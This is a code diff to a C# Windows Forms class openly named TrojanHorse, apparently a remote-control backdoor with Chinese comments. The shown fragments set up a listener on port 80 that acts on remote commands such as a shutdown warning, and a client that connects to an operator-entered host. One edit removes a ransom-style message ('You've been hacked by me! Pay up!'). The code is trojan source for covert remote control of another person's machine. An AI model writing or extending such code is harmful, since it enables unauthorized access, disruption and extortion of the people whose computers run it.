@@ -35,6 +35,7 @@ namespace Aver3.Win
         public TrojanHorse()
         {
             InitializeComponent();
+            CheckForIllegalCrossThreadCalls = false; //不捕获对错误线程的调用
             //加入侦听代码
             //端口可以自己设定，使用固定端口
             int port = 80;
@@ -117,7 +118,7 @@ namespace Aver3.Win
                 //以下是警告
                 if (ss == "jg0000")
                 {
-                    MessageBox.Show("你被我黑了！交钱吧！");
+                    MessageBox.Show("即将关机！");
                     string str = "hkz";
                     byte[] bytee = Encoding.ASCII.GetBytes(str.ToCharArray());
                     socket.Send(bytee, bytee.Length, 0);
@@ -223,23 +224,20 @@ namespace Aver3.Win
                 }
             }
         }
-
         private void button1_Click(object sender, EventArgs e)
         {
-            int port = 6678;
+            int port = 80;
             richTextBox1.AppendText("请求连接" + textBox1.Text + "\r");
-
             try
             {
-                client = new TcpClient(textBox1.Text,port);
+                client = new TcpClient(textBox1.Text,port);//指定主机名称和端口号
             }
-            catch (Exception)
+            catch (Exception ee)
             {
-                MessageBox.Show("服务器不在线上！确定是否未输入主机名称!");
+                MessageBox.Show(ee.Message);
                 richTextBox1.AppendText("服务器不在线上！确定是否未输入主机名称!\r");
             }
         }
-
         private void button2_Click(object sender, EventArgs e)
         {
             richTextBox1.AppendText("测试连接" + "\r");
